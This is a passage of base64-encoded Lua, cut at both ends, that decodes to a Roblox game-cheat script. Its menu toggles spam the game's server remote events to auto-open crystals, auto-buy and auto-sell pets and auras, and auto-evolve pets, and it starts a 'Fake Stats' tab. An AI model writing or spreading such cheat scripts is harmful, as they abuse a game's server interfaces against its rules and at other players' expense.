fSwNCiAgICAgICAge25hbWUgPSAiVWx0aW1hdGUgU3VwZXJub3ZhIFBlZ2FzdXMiLCByYXJpdHkgPSAiRXBpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJBZXRoZXIgU3Bpcml0IEJ1bm55IiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LA0KICAgICAgICB7bmFtZSA9ICJDeWJlcm5ldGljIFNob3dkb3duIERyYWdvbiIsIHJhcml0eSA9ICJVbmlxdWUifQ0KICAgIH0sDQogICAgWyJHYWxheHkgT3JhY2xlIENyeXN0YWwiXSA9IHsNCiAgICAgICAge25hbWUgPSAiRXRlcm5hbCBTdHJpa2UgTGV2aWF0aGFuIiwgcmFyaXR5ID0gIlJhcmUifSwNCiAgICAgICAge25hbWUgPSAiTGlnaHRuaW5nIFN0cmlrZSBQaGFudG9tIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiRGFya3N0YXIgSHVudGVyIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LA0KICAgICAgICB7bmFtZSA9ICJNdXNjbGUgS2luZyIsIHJhcml0eSA9ICJVbmlxdWUifSwNCiAgICAgICAge25hbWUgPSAiQXp1cmUgVHVuZHJhIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiVWx0cmEgSW5mZXJubyIsIHJhcml0eSA9ICJSYXJlIn0NCiAgICB9LA0KICAgIFsiSnVuZ2xlIENyeXN0YWwiXSA9IHsNCiAgICAgICAge25hbWUgPSAiRW50cm9waWMgQmxhc3QiLCByYXJpdHkgPSAiVW5pcXVlIn0sDQogICAgICAgIHtuYW1lID0gIk11c2NsZSBTZW5zZWkiLCByYXJpdHkgPSAiVW5pcXVlIn0sDQogICAgICAgIHtuYW1lID0gIkdyYW5kIFN1cGVybm92YSIsIHJhcml0eSA9ICJFcGljIn0sDQogICAgICAgIHtuYW1lID0gIk5lb24gR3VhcmRpYW4iLCByYXJpdHkgPSAiVW5pcXVlIn0sDQogICAgICAgIHtuYW1lID0gIkV0ZXJuYWwgTWVnYXN0cmlrZSIsIHJhcml0eSA9ICJVbmlxdWUifSwNCiAgICAgICAge25hbWUgPSAiR29sZGVuIFZpa2luZyIsIHJhcml0eSA9ICJFcGljIn0sDQogICAgICAgIHtuYW1lID0gIkFzdHJhbCBFbGVjdHJvIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiRGFyayBFbGVjdHJvIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiRW5jaGFudGVkIE1pcmFnZSIsIHJhcml0eSA9ICJFcGljIn0sDQogICAgICAgIHtuYW1lID0gIlVsdHJhIE1pcmFnZSIsIHJhcml0eSA9ICJVbmlxdWUifSwNCiAgICAgICAge25hbWUgPSAiVW5zdGFibGUgTWlyYWdlIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9DQogICAgfQ0KfQ0KDQotLSBGdW5jdGlvbiB0byBmaW5kIHdoaWNoIGNyeXN0YWwgY29udGFpbnMgYSBzcGVjaWZpYyBwZXQvYXVyYQ0KbG9jYWwgZnVuY3Rpb24gZmluZENyeXN0YWxGb3JJdGVtKGl0ZW1OYW1lKQ0KICAgIGZvciBjcnlzdGFsTmFtZSwgcGV0cyBpbiBwYWlycyhjcnlzdGFsRGF0YSkgZG8NCiAgICAgICAgZm9yIF8sIHBldCBpbiBpcGFpcnMocGV0cykgZG8NCiAgICAgICAgICAgIGlmIHBldC5uYW1lID09IGl0ZW1OYW1lIHRoZW4NCiAgICAgICAgICAgICAgICByZXR1cm4gY3J5c3RhbE5hbWUNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCiAgICByZXR1cm4gbmlsDQplbmQNCg0KLS0gQXV0byBPcGVuIENyeXN0YWxzIFNlY3Rpb24NClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBPcGVuIENyeXN0YWxzIn0pDQoNCmxvY2FsIHNlbGVjdGVkQ3J5c3RhbCA9ICJCbHVlIENyeXN0YWwiDQpsb2NhbCBhdXRvT3BlbkNyeXN0YWwgPSBmYWxzZQ0KDQpsb2NhbCBjcnlzdGFsRHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsNCiAgICBUaXRsZSA9ICJTZWxlY3QgQ3J5c3RhbCIsDQogICAgTGlzdCA9IHsNCiAgICAgICAgIkJsdWUgQ3J5c3RhbCIsICJHcmVlbiBDcnlzdGFsIiwgIkZyb3N0IENyeXN0YWwiLCAiTXl0aGljYWwgQ3J5c3RhbCIsIA0KICAgICAgICAiSW5mZXJubyBDcnlzdGFsIiwgIkxlZ2VuZHMgQ3J5c3RhbCIsICJNdXNjbGUgRWxpdGUgQ3J5c3RhbCIsIA0KICAgICAgICAiR2FsYXh5IE9yYWNsZSBDcnlzdGFsIiwgIkp1bmdsZSBDcnlzdGFsIg0KICAgIH0sDQogICAgVmFsdWUgPSAiQmx1ZSBDcnlzdGFsIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpDQogICAgICAgIHNlbGVjdGVkQ3J5c3RhbCA9IHRleHQNCiAgICBlbmQNCn0pDQoNClBldFNob3BUYWI6VG9nZ2xlKHsNCiAgICBUaXRsZSA9ICJBdXRvIE9wZW4gQ3J5c3RhbCIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IG9wZW4gc2VsZWN0ZWQgY3J5c3RhbCIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBhdXRvT3BlbkNyeXN0YWwgPSBzdGF0ZQ0KICAgICAgICBpZiBzdGF0ZSB0aGVuDQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvT3BlbkNyeXN0YWwgZG8NCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMub3BlbkNyeXN0YWxSZW1vdGU6SW52b2tlU2VydmVyKCJvcGVuQ3J5c3RhbCIsIHNlbGVjdGVkQ3J5c3RhbCkNCiAgICAgICAgICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kKQ0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIEF1dG8gQnV5IFBldHMgJiBBdXJhcyBTZWN0aW9uDQpQZXRTaG9wVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gQnV5IFBldHMgJiBBdXJhcyJ9KQ0KDQpsb2NhbCBzZWxlY3RlZFBldCA9ICIiDQpsb2NhbCBzZWxlY3RlZEF1cmEgPSAiIg0KbG9jYWwgYXV0b0J1eVBldCA9IGZhbHNlDQpsb2NhbCBhdXRvQnV5QXVyYSA9IGZhbHNlDQoNCi0tIFBldCBkcm9wZG93bg0KbG9jYWwgcGV0TGlzdCA9IHsNCiAgICAiQmx1ZSBCaXJkaWUgKEJhc2ljKSIsICJPcmFuZ2UgSGVkZ2Vob2cgKEJhc2ljKSIsICJSZWQgS2l0dHkgKEJhc2ljKSIsICJCbHVlIEJ1bm55IChCYXNpYykiLCAiU2lsdmVyIERvZyAoQmFzaWMpIiwNCiAgICAiRGFyayBWYW1weSAoQWR2YW5jZWQpIiwgIkRhcmsgR29sZW0gKEFkdmFuY2VkKSIsICJHcmVlbiBCdXR0ZXJmbHkgKEFkdmFuY2VkKSIsICJZZWxsb3cgQnV0dGVyZmx5IChBZHZhbmNlZCkiLA0KICAgICJDcmltc29uIEZhbGNvbiAoUmFyZSkiLCAiUHVycGxlIERyYWdvbiAoUmFyZSkiLCAiT3JhbmdlIFBlZ2FzdXMgKFJhcmUpIiwgIlB1cnBsZSBGYWxjb24gKFJhcmUpIiwgIlJlZCBEcmFnb24gKFJhcmUpIiwNCiAgICAiV2hpdGUgUGVnYXN1cyAoUmFyZSkiLCAiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiAoUmFyZSkiLCAiUGhhbnRvbSBHZW5lc2lzIERyYWdvbiAoUmFyZSkiLCAiRXRlcm5hbCBTdHJpa2UgTGV2aWF0aGFuIChSYXJlKSIsDQogICAgIkJsdWUgUGhlb25peCAoRXBpYykiLCAiQmx1ZSBGaXJlY2FzdGVyIChFcGljKSIsICJHb2xkZW4gUGhlb25peCAoRXBpYykiLCAiUmVkIEZpcmVjYXN0ZXIgKEVwaWMpIiwgIkdyZWVuIEZpcmVjYXN0ZXIgKEVwaWMpIiwNCiAgICAiV2hpdGUgUGhlb25peCAoRXBpYykiLCAiRGFyayBMZWdlbmRzIE1hbnRpY29yZSAoRXBpYykiLCAiVWx0aW1hdGUgU3VwZXJub3ZhIFBlZ2FzdXMgKEVwaWMpIiwgIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSAoRXBpYykiLA0KICAgICJHb2xkZW4gVmlraW5nIChFcGljKSIsICJJbmZlcm5hbCBEcmFnb24gKFVuaXF1ZSkiLCAiVWx0cmEgQmlyZGllIChVbmlxdWUpIiwgIk1hZ2ljIEJ1dHRlcmZseSAoVW5pcXVlKSIsICJBZXRoZXIgU3Bpcml0IEJ1bm55IChVbmlxdWUpIiwNCiAgICAiQ3liZXJuZXRpYyBTaG93ZG93biBEcmFnb24gKFVuaXF1ZSkiLCAiRGFya3N0YXIgSHVudGVyIChVbmlxdWUpIiwgIk11c2NsZSBTZW5zZWkgKFVuaXF1ZSkiLCAiTmVvbiBHdWFyZGlhbiAoVW5pcXVlKSINCn0NCg0KbG9jYWwgcGV0RHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsNCiAgICBUaXRsZSA9ICJTZWxlY3QgUGV0IiwNCiAgICBMaXN0ID0gcGV0TGlzdCwNCiAgICBWYWx1ZSA9ICIiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkNCiAgICAgICAgc2VsZWN0ZWRQZXQgPSB0ZXh0DQogICAgZW5kDQp9KQ0KDQotLSBBdXJhIGRyb3Bkb3duDQpsb2NhbCBhdXJhTGlzdCA9IHsNCiAgICAiQmx1ZSBBdXJhIChCYXNpYykiLCAiR3JlZW4gQXVyYSAoQmFzaWMpIiwgIlB1cnBsZSBBdXJhIChCYXNpYykiLCAiUmVkIEF1cmEgKEJhc2ljKSIsICJZZWxsb3cgQXVyYSAoQmFzaWMpIiwNCiAgICAiVWx0cmEgSW5mZXJubyAoUmFyZSkiLCAiQXp1cmUgVHVuZHJhIChFcGljKSIsICJHcmFuZCBTdXBlcm5vdmEgKEVwaWMpIiwgIk11c2NsZSBLaW5nIChVbmlxdWUpIiwgDQogICAgIkVudHJvcGljIEJsYXN0IChVbmlxdWUpIiwgIkV0ZXJuYWwgTWVnYXN0cmlrZSAoVW5pcXVlKSINCn0NCg0KbG9jYWwgYXVyYURyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7DQogICAgVGl0bGUgPSAiU2VsZWN0IEF1cmEiLA0KICAgIExpc3QgPSBhdXJhTGlzdCwNCiAgICBWYWx1ZSA9ICIiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkNCiAgICAgICAgc2VsZWN0ZWRBdXJhID0gdGV4dA0KICAgIGVuZA0KfSkNCg0KUGV0U2hvcFRhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gQnV5IFBldCIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGJ1eSBzZWxlY3RlZCBwZXQiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgYXV0b0J1eVBldCA9IHN0YXRlDQogICAgICAgIGlmIHN0YXRlIGFuZCBzZWxlY3RlZFBldCB+PSAiIiB0aGVuDQogICAgICAgICAgICBsb2NhbCBwZXROYW1lID0gc2VsZWN0ZWRQZXQ6bWF0Y2goIl4oLi0pJXMqJSgiKSBvciBzZWxlY3RlZFBldA0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b0J1eVBldCBkbw0KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwZXRUb0J1eSA9IFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wRm9sZGVyOkZpbmRGaXJzdENoaWxkKHBldE5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwZXRUb0J1eSB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BSZW1vdGU6SW52b2tlU2VydmVyKHBldFRvQnV5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpQZXRTaG9wVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiQXV0byBCdXkgQXVyYSIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGJ1eSBzZWxlY3RlZCBhdXJhIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGF1dG9CdXlBdXJhID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgYW5kIHNlbGVjdGVkQXVyYSB+PSAiIiB0aGVuDQogICAgICAgICAgICBsb2NhbCBhdXJhTmFtZSA9IHNlbGVjdGVkQXVyYTptYXRjaCgiXiguLSklcyolKCIpIG9yIHNlbGVjdGVkQXVyYQ0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b0J1eUF1cmEgZG8NCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXVyYVRvQnV5ID0gUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BGb2xkZXI6RmluZEZpcnN0Q2hpbGQoYXVyYU5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBhdXJhVG9CdXkgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wUmVtb3RlOkludm9rZVNlcnZlcihhdXJhVG9CdXkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kKQ0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIEF1dG8gU2VsbCBQZXRzIFNlY3Rpb24NClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBTZWxsIFBldHMifSkNCg0KbG9jYWwgc2VsZWN0ZWRTZWxsUGV0ID0gIiINCmxvY2FsIGF1dG9TZWxsUGV0ID0gZmFsc2UNCg0KbG9jYWwgc2VsbFBldERyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7DQogICAgVGl0bGUgPSAiU2VsZWN0IFBldCB0byBTZWxsIiwNCiAgICBMaXN0ID0gew0KICAgICAgICAiQmx1ZSBCaXJkaWUiLCAiT3JhbmdlIEhlZGdlaG9nIiwgIlJlZCBLaXR0eSIsICJCbHVlIEJ1bm55IiwgIlNpbHZlciBEb2ciLA0KICAgICAgICAiRGFyayBWYW1weSIsICJEYXJrIEdvbGVtIiwgIkdyZWVuIEJ1dHRlcmZseSIsICJZZWxsb3cgQnV0dGVyZmx5IiwNCiAgICAgICAgIkNyaW1zb24gRmFsY29uIiwgIlB1cnBsZSBEcmFnb24iLCAiT3JhbmdlIFBlZ2FzdXMiLCAiUHVycGxlIEZhbGNvbiIsICJSZWQgRHJhZ29uIiwNCiAgICAgICAgIldoaXRlIFBlZ2FzdXMiLCAiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiIsICJQaGFudG9tIEdlbmVzaXMgRHJhZ29uIiwgIkV0ZXJuYWwgU3RyaWtlIExldmlhdGhhbiIsDQogICAgICAgICJCbHVlIFBoZW9uaXgiLCAiQmx1ZSBGaXJlY2FzdGVyIiwgIkdvbGRlbiBQaGVvbml4IiwgIlJlZCBGaXJlY2FzdGVyIiwgIkdyZWVuIEZpcmVjYXN0ZXIiLA0KICAgICAgICAiV2hpdGUgUGhlb25peCIsICJEYXJrIExlZ2VuZHMgTWFudGljb3JlIiwgIlVsdGltYXRlIFN1cGVybm92YSBQZWdhc3VzIiwgIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSIsDQogICAgICAgICJHb2xkZW4gVmlraW5nIiwgIkluZmVybmFsIERyYWdvbiIsICJVbHRyYSBCaXJkaWUiLCAiTWFnaWMgQnV0dGVyZmx5IiwgIkFldGhlciBTcGlyaXQgQnVubnkiLA0KICAgICAgICAiQ3liZXJuZXRpYyBTaG93ZG93biBEcmFnb24iLCAiRGFya3N0YXIgSHVudGVyIiwgIk11c2NsZSBTZW5zZWkiLCAiTmVvbiBHdWFyZGlhbiINCiAgICB9LA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQ0KICAgICAgICBzZWxlY3RlZFNlbGxQZXQgPSB0ZXh0DQogICAgZW5kDQp9KQ0KDQpQZXRTaG9wVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiQXV0byBTZWxsIFBldCIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IHNlbGwgc2VsZWN0ZWQgcGV0IiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGF1dG9TZWxsUGV0ID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgYW5kIHNlbGVjdGVkU2VsbFBldCB+PSAiIiB0aGVuDQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvU2VsbFBldCBkbw0KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmb3VuZFBldCA9IG5pbA0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwbGF5ZXIucGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGV0ID0gZm9sZGVyOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkU2VsbFBldCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGV0IHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kUGV0ID0gcGV0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZm91bmRQZXQgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnNlbGxQZXRFdmVudDpGaXJlU2VydmVyKCJzZWxsUGV0IiwgZm91bmRQZXQpDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1NlbGxQZXQgPSBmYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQotLSBBdXRvIEV2b2x2ZSBQZXRzIFNlY3Rpb24NClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBFdm9sdmUgUGV0cyJ9KQ0KDQpsb2NhbCBzZWxlY3RlZFJhcml0eSA9ICIiDQpsb2NhbCBhdXRvRXZvbHZlID0gZmFsc2UNCg0KbG9jYWwgZXZvbHZlRHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsNCiAgICBUaXRsZSA9ICJTZWxlY3QgUmFyaXR5IHRvIEV2b2x2ZSIsDQogICAgTGlzdCA9IHsiQmFzaWMiLCAiQWR2YW5jZWQiLCAiUmFyZSIsICJFcGljIiwgIlVuaXF1ZSJ9LA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQ0KICAgICAgICBzZWxlY3RlZFJhcml0eSA9IHRleHQNCiAgICBlbmQNCn0pDQoNClBldFNob3BUYWI6VG9nZ2xlKHsNCiAgICBUaXRsZSA9ICJBdXRvIEV2b2x2ZSBQZXRzIiwNCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZXZvbHZlIHBldHMgb2Ygc2VsZWN0ZWQgcmFyaXR5IiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGF1dG9Fdm9sdmUgPSBzdGF0ZQ0KICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRSYXJpdHkgfj0gIiIgdGhlbg0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b0V2b2x2ZSBkbw0KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHBsYXllci5wZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGNyeXN0YWxOYW1lLCBwZXRzIGluIHBhaXJzKGNyeXN0YWxEYXRhKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBwZXREYXRhIGluIGlwYWlycyhwZXRzKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwZXREYXRhLm5hbWUgPT0gcGV0Lk5hbWUgYW5kIHBldERhdGEucmFyaXR5ID09IHNlbGVjdGVkUmFyaXR5IHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnBldEV2b2x2ZUV2ZW50OkZpcmVTZXJ2ZXIoImV2b2x2ZVBldCIsIHBldC5OYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQpDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KUGV0U2hvcFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIkV2b2x2ZSBTZWxlY3RlZCBSYXJpdHkgT25jZSIsDQogICAgRGVzYyA9ICJFdm9sdmUgYWxsIHBldHMgb2Ygc2VsZWN0ZWQgcmFyaXR5IG9uY2UiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBpZiBzZWxlY3RlZFJhcml0eSA9PSAiIiB0aGVuIHJldHVybiBlbmQNCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQ0KICAgICAgICAgICAgbG9jYWwgZXZvbHZlZENvdW50ID0gMA0KICAgICAgICAgICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwbGF5ZXIucGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbw0KICAgICAgICAgICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBjcnlzdGFsTmFtZSwgcGV0cyBpbiBwYWlycyhjcnlzdGFsRGF0YSkgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGV0RGF0YSBpbiBpcGFpcnMocGV0cykgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGV0RGF0YS5uYW1lID09IHBldC5OYW1lIGFuZCBwZXREYXRhLnJhcml0eSA9PSBzZWxlY3RlZFJhcml0eSB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5wZXRFdm9sdmVFdmVudDpGaXJlU2VydmVyKCJldm9sdmVQZXQiLCBwZXQuTmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2b2x2ZWRDb3VudCA9IGV2b2x2ZWRDb3VudCArIDENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgICAgIFRpdGxlID0gIkV2b2x2ZSBDb21wbGV0ZSIsDQogICAgICAgICAgICAgICAgRGVzYyA9ICJFdm9sdmVkICIgLi4gZXZvbHZlZENvdW50IC4uICIgIiAuLiBzZWxlY3RlZFJhcml0eSAuLiAiIHBldHMiLA0KICAgICAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgICAgICB9KQ0KICAgICAgICBlbmQpDQogICAgZW5kDQp9KQ0KDQotLSBGYWtlIFN0YXRzIFRhYg0KbG9jYWwgRmFrZVN0YXRzVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiRmFrZSBTdGF0cyIsIEljb24gPSAidHJlbmRpbmctdXAifSkNCg0KLS0gRmFrZSBzdGF0cyBzdG9yYWdlDQpsb2NhbCBmYWtlU3RhdHMgPSB7DQogICAgU3RyZW5ndGggPSAwLA0KICAgIER1cmFiaWxpdHkgPSAwLA0KICAgIFJlYmlydGhzID0gMCwNCiAgICBHZW1zID0gMCwNCiAgICBLaWxscyA9IDAsDQogICAgQnJhd2xzID0gMCwNCiAgICBBZ2lsaXR5ID0gMCwNCiAgICBHb29kS2FybWEgPSAwLA0KICAgIEV2aWxLYXJtYSA9IDANCn0NCg0KLS0gVG9nZ2xlIHN0YXRlcyBmb3IgZWFjaCBzdGF0DQpsb2NhbCB0b2dnbGVTdGF0ZXMgPSB7DQogICAgU3RyZW5ndGggPSBmYWxzZSwNCiAgICBEdXJhYmlsaXR5ID0gZmFsc2UsDQogICAgUmViaXJ0aHMgPSBmYWxzZSwNCiAgICBHZW1zID0g